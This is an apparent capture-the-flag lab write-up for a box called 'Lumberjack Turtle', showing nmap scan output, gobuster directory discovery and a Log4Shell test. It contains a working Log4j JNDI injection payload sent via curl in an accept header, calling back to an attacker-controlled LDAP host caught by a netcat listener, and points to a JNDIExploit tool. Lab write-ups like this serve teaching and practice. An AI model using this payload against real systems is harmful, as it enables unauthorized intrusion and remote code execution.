# Lumberjack Turtle


1. Enumerate with nmap
```
$ sudo nmap -sS -A 10.10.51.187
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-08 23:13 EST
Nmap scan report for 10.10.51.187
Host is up (0.20s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE     VERSION
22/tcp open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6a:a1:2d:13:6c:8f:3a:2d:e3:ed:84:f4:c7:bf:20:32 (RSA)
|   256 1d:ac:5b:d6:7c:0c:7b:5b:d4:fe:e8:fc:a1:6a:df:7a (ECDSA)
|_  256 13:ee:51:78:41:7e:3f:54:3b:9a:24:9b:06:e2:d5:14 (ED25519)
80/tcp open  nagios-nsca Nagios NSCA
|_http-title: Site doesn't have a title (text/plain;charset=UTF-8).
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=2/8%OT=22%CT=1%CU=34817%PV=Y%DS=4%DC=T%G=Y%TM=62033FA8
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)SEQ(
OS:SP=105%GCD=1%ISR=10D%TI=Z%CI=Z%TS=A)OPS(O1=M506ST11NW7%O2=M506ST11NW7%O3
OS:=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST11NW7%O6=M506ST11)WIN(W1=F4B3%W2=F
OS:4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M506NNSNW
OS:7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF
OS:=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=
OS:%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=
OS:0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RI
OS:PCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 256/tcp)
HOP RTT       ADDRESS
1   231.17 ms 10.13.0.1
2   ... 3
4   231.27 ms 10.10.51.187

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 80.43 seconds
```

2. Go to the website, use gobuster twice to find the hidden directories `http://<ip address>/~logs/log4j`
3. The hint says `Hello, vulnerable world! What could we do HERE?`. Check if it's vulnerable to log4jshell by setting up a netcat listener at a port `nc -nvlp <port>` and then sending a GET request with a log4j payload in the `accept` header `curl -H 'accept:${jndi:ldap://<attacker ip address>:9999}' http://<target ip address>/~logs/log4j`. If a connection is received, then it's vulnerable
4. Use the [JNDIExploit package](https://github.com/christophetd/log4shell-vulnerable-app/blob/main/README.md)
